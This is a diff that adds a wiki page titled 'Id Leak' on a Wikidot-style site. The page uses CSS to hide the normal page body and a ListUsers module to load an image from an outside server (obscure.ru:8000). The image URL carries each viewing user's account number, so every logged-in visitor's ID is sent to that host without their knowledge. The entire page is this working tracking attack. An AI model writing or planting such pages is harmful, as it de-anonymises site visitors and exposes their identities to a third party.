@@ -1,0 +1,35 @@
+---
+title: "Id Leak"
+tags: []
+page_id: "1084121470"
+site: "obscurative"
+slug: "id-leak"
+revision: 9
+revision_id: "1159252686"
+author: 4518363
+timestamp: 1590589544
+---
+
+[[module CSS]]
+#page-content {
+  visibility: visible;
+    position: fixed;
+  top: 0;
+  left: 0;
+  width: 100vw;
+  height: 100vh;
+  bottom: 0;
+}
+
+body {
+  visibility: none;
+}
+[[/module]]
+
+[[div id="cover"]]
+[[module ListUsers users="."]]
+[[image http://obscure.ru:8000/id-leak/%%number%%]]
+%%title%%
+[[/module]]
+[[/div]]
+
